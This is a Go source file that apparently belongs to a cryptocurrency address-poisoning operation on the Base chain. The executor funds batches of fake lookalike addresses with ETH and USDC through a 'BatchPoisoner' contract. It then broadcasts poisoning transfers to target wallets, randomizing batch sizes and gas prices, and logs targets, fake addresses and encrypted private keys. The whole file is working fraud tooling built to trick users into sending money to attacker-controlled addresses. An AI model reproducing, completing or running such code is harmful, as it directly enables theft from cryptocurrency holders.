package executor

import (
	"context"
	"crypto/ecdsa"
	"errors"
	"fmt"
	"math/big"
	"math/rand"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"exploit/core"

	"github.com/ethereum/go-ethereum/accounts/abi"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"go.uber.org/zap"
)

// ExecutorConfig 执行器配置 (Base链)
type ExecutorConfig struct {
	BatchSizeMin        int
	BatchSizeMax        int
	BatchTimeout        time.Duration
	MaxConcurrent       int
	GasPriceMultiplier  float64
	ETHAmount           *big.Int // 每个伪造地址充值的ETH (gas费)
	USDTAmount          *big.Int // 未使用 (Base链不支持USDT)
	USDCAmount          *big.Int // 每个伪造地址充值的USDC (Base: 6位小数)
	WETHAmount          *big.Int // 未使用 (Base链不支持WETH投毒)
	GasPriceGwei        float64  // Gas价格 (Gwei), Base L2极低
	ContractConfirmSecs int      // 合约交易确认等待时间
}

// BatchExecutor 批量执行器
type BatchExecutor struct {
	ethClients      []*ethclient.Client // 多RPC客户端轮询
	clientIndex     int                 // 当前客户端索引
	clientMu        sync.Mutex          // 客户端轮询锁
	queue           *core.MatchQueue    // 内存队列 (替代Redis)
	broadcaster     *Broadcaster
	dedup           *core.Deduplicator // 去重器 (记录投毒结果)
	logger          *zap.Logger
	stats           *core.Stats
	config          ExecutorConfig
	contractAddr    common.Address
	ownerKey        *bind.TransactOpts
	ownerPrivateKey *ecdsa.PrivateKey
	chainID         *big.Int
	rng             *rand.Rand
	mu              sync.Mutex
	pendingBatch    []core.MatchedTarget
	batchTimer      *time.Timer
	currentTarget   int // 当前批次的目标大小
}

// BatchPoisoner 合约 ABI (只包含需要的函数)
// Base链: 使用 batchTransferBNBAndUSDC (合约函数名保持不变，实际发送ETH+USDC)
const batchPoisonerABI = `[
{"inputs":[{"internalType":"address[]","name":"recipients","type":"address[]"}],"name":"batchTransferBoth","outputs":[],"stateMutability":"payable","type":"function"},
{"inputs":[{"internalType":"address[]","name":"recipients","type":"address[]"}],"name":"batchTransferBNBAndUSDC","outputs":[],"stateMutability":"payable","type":"function"},
{"inputs":[{"internalType":"uint256","name":"_bnbAmount","type":"uint256"},{"internalType":"uint256","name":"_usdtAmount","type":"uint256"},{"internalType":"uint256","name":"_usdcAmount","type":"uint256"},{"internalType":"uint256","name":"_wbnbAmount","type":"uint256"}],"name":"setDefaultAmounts","outputs":[],"stateMutability":"nonpayable","type":"function"}
]`

// NewBatchExecutor 创建批量执行器
func NewBatchExecutor(
	ethClients []*ethclient.Client, // 改为接收多个客户端
	queue *core.MatchQueue,
	broadcaster *Broadcaster,
	dedup *core.Deduplicator,
	logger *zap.Logger,
	stats *core.Stats,
	config ExecutorConfig,
	contractAddr common.Address,
	ownerPrivateKey *ecdsa.PrivateKey,
	chainID *big.Int,
) *BatchExecutor {
	return &BatchExecutor{
		ethClients:      ethClients,
		queue:           queue,
		broadcaster:     broadcaster,
		dedup:           dedup,
		logger:          logger,
		stats:           stats,
		config:          config,
		contractAddr:    contractAddr,
		ownerPrivateKey: ownerPrivateKey,
		chainID:         chainID,
		rng:             rand.New(rand.NewSource(time.Now().UnixNano())),
		pendingBatch:    make([]core.MatchedTarget, 0, config.BatchSizeMax),
	}
}

// getNextClient 轮询获取下一个RPC客户端
func (e *BatchExecutor) getNextClient() *ethclient.Client {
	e.clientMu.Lock()
	defer e.clientMu.Unlock()
	client := e.ethClients[e.clientIndex]
	e.clientIndex = (e.clientIndex + 1) % len(e.ethClients)
	return client
}

// UpdateContractAmounts 更新合约的默认充值金额
// 在启动时调用一次，确保合约的充值金额与配置一致
func (e *BatchExecutor) UpdateContractAmounts(ctx context.Context) error {
	if e.ownerPrivateKey == nil {
		return errors.New("owner private key not set")
	}
	if e.contractAddr == (common.Address{}) {
		return errors.New("contract address not set")
	}

	// 解析ABI
	parsedABI, err := abi.JSON(strings.NewReader(batchPoisonerABI))
	if err != nil {
		return err
	}

	// 编码 setDefaultAmounts 调用数据
	// function setDefaultAmounts(uint256 _bnbAmount, uint256 _usdtAmount, uint256 _usdcAmount, uint256 _wbnbAmount)
	// 注: 合约参数名保持_bnbAmount，但在Base链上实际是ETH
	data, err := parsedABI.Pack("setDefaultAmounts",
		e.config.ETHAmount,  // 对应合约的_bnbAmount
		e.config.USDTAmount, // 对应合约的_usdtAmount
		e.config.USDCAmount, // 对应合约的_usdcAmount
		e.config.WETHAmount, // 对应合约的_wbnbAmount
	)
	if err != nil {
		return fmt.Errorf("pack setDefaultAmounts failed: %w", err)
	}

	// 获取nonce (带重试)
	fromAddr := crypto.PubkeyToAddress(e.ownerPrivateKey.PublicKey)
	var nonce uint64
	var nonceErr error
	for retry := 0; retry < 3; retry++ {
		client := e.getNextClient()
		nonce, nonceErr = client.PendingNonceAt(ctx, fromAddr)
		if nonceErr == nil {
			break
		}
		if retry < 2 {
			time.Sleep(300 * time.Millisecond)
		}
	}
	if nonceErr != nil {
		return fmt.Errorf("get nonce failed after 3 retries: %w", nonceErr)
	}

	// 使用较高的gas价格 (确保交易被接受)
	gasPrice := big.NewInt(5e8) // 0.5 Gwei

	// 创建交易
	tx := types.NewTransaction(
		nonce,
		e.contractAddr,
		big.NewInt(0),
		100000, // setDefaultAmounts 大约需要50000 gas
		gasPrice,
		data,
	)

	// 签名
	signedTx, err := types.SignTx(tx, types.NewEIP155Signer(e.chainID), e.ownerPrivateKey)
	if err != nil {
		return fmt.Errorf("sign tx failed: %w", err)
	}

	// 发送 (带重试)
	var sendErr error
	for retry := 0; retry < 3; retry++ {
		client := e.getNextClient()
		sendErr = client.SendTransaction(ctx, signedTx)
		if sendErr == nil {
			break
		}
		if strings.Contains(sendErr.Error(), "already known") {
			sendErr = nil // 已在内存池中，视为成功
			break
		}
		if retry < 2 {
			e.logger.Warn("⚠️ 发送setDefaultAmounts失败，重试", zap.Int("retry", retry+1), zap.Error(sendErr))
			time.Sleep(500 * time.Millisecond)
		}
	}
	if sendErr != nil {
		return fmt.Errorf("send tx failed after 3 retries: %w", sendErr)
	}

	e.logger.Info("✅ 合约充值金额已更新 (Base链)",
		zap.String("tx", signedTx.Hash().Hex()[:18]+"..."),
		zap.String("ETH", fmt.Sprintf("%.9f", float64(e.config.ETHAmount.Int64())/1e18)),
		zap.String("USDC", fmt.Sprintf("%.6f", float64(e.config.USDCAmount.Int64())/1e6))) // USDC 6位小数

	return nil
}

// Start 启动执行器
func (e *BatchExecutor) Start(ctx context.Context) error {
	e.logger.Info("Starting batch executor",
		zap.Int("batch_min", e.config.BatchSizeMin),
		zap.Int("batch_max", e.config.BatchSizeMax))
	e.resetTimer()

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
			e.consumeQueue(ctx)
		}
	}
}

// consumeQueue 消费内存队列
func (e *BatchExecutor) consumeQueue(ctx context.Context) {
	// 从内存队列取出匹配 (阻塞最多1秒)
	matched, ok := e.queue.Pop(ctx)
	if !ok {
		return
	}
	e.addToBatch(ctx, matched)
}

// addToBatch 添加到批次
func (e *BatchExecutor) addToBatch(ctx context.Context, matched core.MatchedTarget) {
	e.mu.Lock()

	// 检查伪造地址是否已在当前批次中 (去重)
	fakeAddr := matched.FakeAddress.Address
	for _, existing := range e.pendingBatch {
		if existing.FakeAddress.Address == fakeAddr {
			e.mu.Unlock()
			e.logger.Debug("⏭️ 跳过重复伪造地址",
				zap.String("fake", fakeAddr),
				zap.String("target", matched.Target.PoisonTo))
			return
		}
	}

	// 如果是新批次的第一个，设置目标大小
	if len(e.pendingBatch) == 0 {
		e.currentTarget = e.config.BatchSizeMin + e.rng.Intn(e.config.BatchSizeMax-e.config.BatchSizeMin+1)
		e.logger.Info("📦 新批次开始", zap.Int("目标数量", e.currentTarget))
		if e.stats != nil {
			e.stats.AddWebLog("INFO", "execute", fmt.Sprintf("📦 新批次开始，目标: %d 个匹配", e.currentTarget), "")
		}
	}
	e.pendingBatch = append(e.pendingBatch, matched)
	batchSize := len(e.pendingBatch)
	targetSize := e.currentTarget
	e.mu.Unlock()

	e.logger.Info("➕ 添加到批次", zap.Int("当前", batchSize), zap.Int("目标", targetSize))
	if e.stats != nil {
		e.stats.AddWebLog("INFO", "execute", fmt.Sprintf("➕ 添加到批次: %d/%d", batchSize, targetSize), "")
	}

	if batchSize >= targetSize {
		e.executeBatch(ctx)
	}
}

// resetTimer 重置批量定时器
func (e *BatchExecutor) resetTimer() {
	if e.batchTimer != nil {
		e.batchTimer.Stop()
	}
	e.batchTimer = time.AfterFunc(e.config.BatchTimeout, func() {
		e.executeBatchIfReady(context.Background(), true) // forceTimeout=true
	})
}

// executeBatchIfReady 检查是否满足执行条件
func (e *BatchExecutor) executeBatchIfReady(ctx context.Context, forceTimeout bool) {
	e.mu.Lock()
	batchSize := len(e.pendingBatch)

	// 如果批次为空，直接返回
	if batchSize == 0 {
		e.mu.Unlock()
		e.resetTimer()
		return
	}

	// 如果不是超时强制执行，且未达到最小数量，不执行
	if !forceTimeout && batchSize < e.config.BatchSizeMin {
		e.mu.Unlock()
		return
	}

	// 如果是超时但未达到最小数量，记录日志但仍执行
	if forceTimeout && batchSize < e.config.BatchSizeMin {
		e.logger.Info("⏰ 超时执行批次 (未达到最小数量)",
			zap.Int("当前数量", batchSize),
			zap.Int("最小数量", e.config.BatchSizeMin))
	}

	batch := e.pendingBatch
	e.pendingBatch = make([]core.MatchedTarget, 0, e.config.BatchSizeMax)
	e.currentTarget = 0 // 重置目标大小，下次添加时重新计算
	e.mu.Unlock()

	e.resetTimer()
	e.logger.Info("🚀 开始执行批次", zap.Int("size", len(batch)))
	go e.processBatch(ctx, batch)
}

// executeBatch 执行当前批次 (达到目标数量时调用)
func (e *BatchExecutor) executeBatch(ctx context.Context) {
	e.executeBatchIfReady(ctx, false)
}

// processBatch 处理批次
func (e *BatchExecutor) processBatch(ctx context.Context, batch []core.MatchedTarget) {
	start := time.Now()
	batchSize := len(batch)

	// 辅助函数: 添加Web日志
	webLog := func(level, category, msg, details string) {
		if e.stats != nil {
			e.stats.AddWebLog(level, category, msg, details)
		}
	}

	webLog("INFO", "execute", fmt.Sprintf("🚀 开始执行批次，共 %d 个目标", batchSize), "")

	// 检查私钥是否配置
	if e.ownerPrivateKey == nil {
		e.logger.Error("Owner private key not configured, cannot call contract")
		webLog("ERROR", "execute", "❌ 私钥未配置，无法调用合约", "")
		return
	}

	// Base L2 gas价格: 从 Broadcaster 获取缓存的实时价格，再上浮 10%-15%
	cachedGasWei := e.broadcaster.GetCachedGasPrice()
	multiplier := 1.10 + e.rng.Float64()*0.05 // 1.10 ~ 1.20 (10%-15% 浮动)
	gasPriceWei := int64(float64(cachedGasWei) * multiplier)
	if gasPriceWei < 10000000 { // 最低 0.01 Gwei
		gasPriceWei = 10000000
	}
	gasPrice := big.NewInt(gasPriceWei)
	gasPriceGweiStr := fmt.Sprintf("%.6f", float64(gasPriceWei)/1e9)
	e.logger.Info("💰 Base链合约调用Gas价格", zap.String("gwei", gasPriceGweiStr), zap.String("上浮", fmt.Sprintf("%.0f%%", (multiplier-1)*100)))
	webLog("INFO", "execute", fmt.Sprintf("💰 Base Gas: %s Gwei", gasPriceGweiStr), "")

	// Step 1: Base链只使用USDC，调用 batchTransferBNBAndUSDC (ETH + USDC)
	// 准备伪造地址列表
	fakeAddresses := make([]common.Address, len(batch))
	for i, m := range batch {
		fakeAddresses[i] = common.HexToAddress("0x" + m.FakeAddress.Address)
	}

	e.logger.Info("🚀 Step 1: Base链充值 (ETH+USDC)",
		zap.Int("地址数", len(fakeAddresses)))
	webLog("INFO", "execute", fmt.Sprintf("📝 Step 1: Base链充值 (%d个地址)", len(fakeAddresses)), "")

	// 调用合约 batchTransferBNBAndUSDC (合约函数名保持不变)
	methodName := "batchTransferBNBAndUSDC"
	txHash, err := e.callBatchTransferByToken(ctx, fakeAddresses, gasPrice, methodName)
	if err != nil {
		e.logger.Error("❌ 合约调用失败，终止批次",
			zap.String("method", methodName),
			zap.Error(err))
		webLog("ERROR", "execute", "❌ 合约充值失败，终止批次", err.Error())

		// 更新统计
		if e.stats != nil {
			for range batch {
				e.stats.IncrFailed()
			}
		}

		e.logger.Info("🎉 批次执行完成 (合约调用失败)",
			zap.Int("批次大小", batchSize),
			zap.Int("成功", 0),
			zap.Int("失败", batchSize),
			zap.String("成功率", "0.0%"),
			zap.Duration("耗时", time.Since(start)))
		return
	}

	e.logger.Info("✅ 合约充值完成",
		zap.Int("数量", len(fakeAddresses)),
		zap.String("tx", txHash.Hex()[:18]+"..."))
	webLog("INFO", "execute", fmt.Sprintf("✅ 充值完成 (%d个)", len(fakeAddresses)),
		fmt.Sprintf("TxHash: %s", txHash.Hex()[:18]+"..."))

	// 统计
	if e.stats != nil {
		e.stats.ContractCalls.Add(1)
		gasUsed := int64(50000 + 50000*len(fakeAddresses)) // Base链: 每地址约50000 gas
		gasCost := new(big.Int).Mul(gasPrice, big.NewInt(gasUsed))
		e.stats.GasUsed.Add(gasCost.Int64())
	}

	e.logger.Info("✅ Step 1 完成: 合约充值成功")
	webLog("INFO", "execute", "✅ Step 1 完成: 合约充值成功", "")

	// Step 2: 等待交易确认 (最多60秒，轮询多个RPC节点)
	e.logger.Info("⏳ Step 2: 等待合约交易确认...")
	webLog("INFO", "execute", "⏳ Step 2: 等待交易确认...", "")

	confirmed := e.waitForConfirmation(ctx, txHash, 60*time.Second)
	if !confirmed {
		e.logger.Error("❌ 合约充值交易超时未确认，跳过投毒")
		webLog("ERROR", "execute", "❌ 合约充值超时，批次取消", "")
		if e.stats != nil {
			for range batch {
				e.stats.IncrFailed()
			}
		}
		e.logger.Info("🎉 批次执行完成 (合约充值超时)",
			zap.Int("批次大小", batchSize),
			zap.Int("成功", 0),
			zap.Int("失败", batchSize),
			zap.String("成功率", "0.0%"),
			zap.Duration("耗时", time.Since(start)))
		return
	}

	e.logger.Info("✅ Step 2 完成: 合约交易已确认")
	webLog("INFO", "execute", "✅ Step 2 完成: 已确认", "")

	// Step 3: 并发转账
	e.logger.Info("📤 Step 3: 广播投毒交易")
	webLog("INFO", "execute", fmt.Sprintf("📤 Step 3: 开始广播 %d 笔投毒交易...", batchSize), "")

	var wg sync.WaitGroup
	sem := make(chan struct{}, e.config.MaxConcurrent)
	var successCount, failCount int64

	for idx, m := range batch {
		wg.Add(1)
		sem <- struct{}{}
		go func(matched core.MatchedTarget, index int) {
			defer wg.Done()
			defer func() { <-sem }()

			txHash, err := e.broadcaster.BroadcastTransferWithHash(ctx, matched)
			status := "success"
			// 投毒目标是 PoisonTo (发送方A)，匹配用的是 MatchAddr (接收方B)
			poisonTo := matched.Target.PoisonTo
			if poisonTo == "" {
				poisonTo = matched.Target.From // 兼容
			}
			if err != nil {
				status = "failed"
				atomic.AddInt64(&failCount, 1)
				if e.stats != nil {
					e.stats.IncrFailed()
				}
				webLog("ERROR", "execute", fmt.Sprintf("❌ 转账失败 [%d/%d]", index+1, batchSize),
					fmt.Sprintf("伪造: %s -> 投毒目标: %s, 错误: %s",
						matched.FakeAddress.Address[:10], poisonTo[:10], err.Error()))
			} else {
				atomic.AddInt64(&successCount, 1)
				if e.stats != nil {
					e.stats.IncrSuccess()
				}
				// 安全截取 txHash
				txHashDisplay := txHash
				if len(txHash) > 16 {
					txHashDisplay = txHash[:16] + "..."
				}
				webLog("INFO", "execute", fmt.Sprintf("✅ 转账成功 [%d/%d]", index+1, batchSize),
					fmt.Sprintf("伪造: %s -> 投毒目标: %s, TxHash: %s",
						matched.FakeAddress.Address[:10], poisonTo[:10], txHashDisplay))

				// 记录已使用的伪造地址到 used_fake_addresses 表
				if e.dedup != nil {
					if usedErr := e.dedup.RecordUsedFakeAddress(ctx, matched.FakeAddress.Address, matched.FakeAddress.EncryptedPrivateKey); usedErr != nil {
						e.logger.Warn("记录已使用伪造地址失败", zap.Error(usedErr))
					}
				}
			}

			// 记录到dedup表 (用于2天去重) - 记录投毒目标
			if e.dedup != nil {
				record := core.PoisonRecord{
					TargetAddress:       poisonTo, // 投毒目标是发送方A
					FakeAddress:         matched.FakeAddress.Address,
					EncryptedPrivateKey: matched.FakeAddress.EncryptedPrivateKey,
					TxHash:              txHash,
					USDTAmount:          float64(e.config.USDCAmount.Int64()) / 1e6, // Base USDC 6位小数
					Status:              status,
				}
				if _, recordErr := e.dedup.RecordPoison(ctx, record); recordErr != nil {
					e.logger.Warn("记录投毒失败", zap.Error(recordErr))
				}
			}

			if e.stats != nil {
				e.stats.IncrSent()
				e.stats.MatchesPending.Add(-1)
			}
		}(m, idx)
	}

	wg.Wait()

	if e.stats != nil {
		e.stats.IncrBatch()
	}

	elapsed := time.Since(start)
	successRate := float64(successCount) / float64(batchSize) * 100

	e.logger.Info("🎉 批次执行完成",
		zap.Int("批次大小", batchSize),
		zap.Int64("成功", successCount),
		zap.Int64("失败", failCount),
		zap.String("成功率", fmt.Sprintf("%.1f%%", successRate)),
		zap.Duration("耗时", elapsed))

	webLog("INFO", "execute",
		fmt.Sprintf("🎉 批次执行完成: 成功 %d, 失败 %d, 成功率 %.1f%%", successCount, failCount, successRate),
		fmt.Sprintf("耗时: %v, 累计成功: %d", elapsed.Round(time.Millisecond), e.stats.TransfersSuccess.Load()))
}

// callBatchTransferByToken 根据代币类型调用对应的合约方法
// methodName: batchTransferETHAndUSDC (Base链使用ETH+USDC)
func (e *BatchExecutor) callBatchTransferByToken(ctx context.Context, recipients []common.Address, gasPrice *big.Int, methodName string) (common.Hash, error) {
	// 解析ABI
	parsedABI, err := abi.JSON(strings.NewReader(batchPoisonerABI))
	if err != nil {
		return common.Hash{}, err
	}

	// 编码函数调用数据
	data, err := parsedABI.Pack(methodName, recipients)
	if err != nil {
		return common.Hash{}, err
	}

	// 获取发送者地址和nonce (带重试)
	fromAddr := crypto.PubkeyToAddress(e.ownerPrivateKey.PublicKey)
	var nonce uint64
	var nonceErr error
	for retry := 0; retry < 3; retry++ {
		client := e.getNextClient()
		nonce, nonceErr = client.PendingNonceAt(ctx, fromAddr)
		if nonceErr == nil {
			break
		}
		if retry < 2 {
			e.logger.Warn("⚠️ 获取nonce失败，重试", zap.Int("retry", retry+1), zap.Error(nonceErr))
			time.Sleep(300 * time.Millisecond)
		}
	}
	if nonceErr != nil {
		return common.Hash{}, fmt.Errorf("get nonce failed after 3 retries: %w", nonceErr)
	}

	// 估算Gas (Base链实测数据):
	// 基础开销约 50,000, 每地址约 50,000, 额外 10% 缓冲
	gasLimit := uint64(float64(50000+50000*len(recipients)) * 1.1)

	// 记录调试信息
	e.logger.Debug("📝 准备发送合约交易",
		zap.String("from", fromAddr.Hex()),
		zap.String("to", e.contractAddr.Hex()),
		zap.Uint64("nonce", nonce),
		zap.Uint64("gasLimit", gasLimit),
		zap.String("gasPrice", gasPrice.String()),
		zap.Int("recipients", len(recipients)),
		zap.String("method", methodName))

	// 创建交易 (value = 0, 因为合约里已有ETH余额)
	tx := types.NewTransaction(
		nonce,
		e.contractAddr,
		big.NewInt(0), // 不发送额外ETH，使用合约余额
		gasLimit,
		gasPrice,
		data,
	)

	// 签名交易
	signedTx, err := types.SignTx(tx, types.NewEIP155Signer(e.chainID), e.ownerPrivateKey)
	if err != nil {
		return common.Hash{}, fmt.Errorf("sign tx failed: %w", err)
	}

	// 发送交易 (带重试，轮询RPC节点)
	var sendErr error
	for retry := 0; retry < 3; retry++ {
		client := e.getNextClient()
		sendErr = client.SendTransaction(ctx, signedTx)
		if sendErr == nil {
			break
		}
		// "already known" 表示交易已在内存池中，视为成功
		if strings.Contains(sendErr.Error(), "already known") {
			e.logger.Warn("⚠️ 交易已在内存池中",
				zap.String("txHash", signedTx.Hash().Hex()[:18]+"..."),
				zap.Uint64("nonce", nonce))
			return signedTx.Hash(), nil
		}
		// RPC 错误，切换节点重试
		if retry < 2 {
			e.logger.Warn("⚠️ 发送失败，切换RPC重试",
				zap.Int("retry", retry+1),
				zap.Error(sendErr))
			time.Sleep(500 * time.Millisecond)
		}
	}
	if sendErr != nil {
		e.logger.Error("❌ 发送交易失败 (3次重试后)",
			zap.String("txHash", signedTx.Hash().Hex()),
			zap.Uint64("nonce", nonce),
			zap.String("gasPrice", gasPrice.String()),
			zap.Error(sendErr))
		return common.Hash{}, fmt.Errorf("send tx failed (nonce=%d, gasPrice=%s): %w", nonce, gasPrice.String(), sendErr)
	}

	e.logger.Info("✅ 交易已发送",
		zap.String("txHash", signedTx.Hash().Hex()[:18]+"..."),
		zap.Uint64("nonce", nonce))

	return signedTx.Hash(), nil
}

// waitForConfirmation 等待交易确认
func (e *BatchExecutor) waitForConfirmation(ctx context.Context, txHash common.Hash, timeout time.Duration) bool {
	deadline := time.Now().Add(timeout)
	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return false
		case <-ticker.C:
			client := e.getNextClient() // 轮询RPC节点
			receipt, err := client.TransactionReceipt(ctx, txHash)
			if err != nil {
				continue // 交易可能还未被打包
			}
			// status: 1=成功, 0=失败
			if receipt.Status == 1 {
				e.logger.Info("✅ 交易确认成功",
					zap.String("tx", txHash.Hex()[:18]+"..."),
					zap.Uint64("gasUsed", receipt.GasUsed),
					zap.Uint64("block", receipt.BlockNumber.Uint64()))
				return true
			} else {
				e.logger.Error("❌ 交易执行失败 (reverted)",
					zap.String("tx", txHash.Hex()),
					zap.Uint64("gasUsed", receipt.GasUsed))
				return false
			}
		}
	}

	e.logger.Warn("⚠️ 交易确认超时", zap.String("tx", txHash.Hex()))
	return false
}
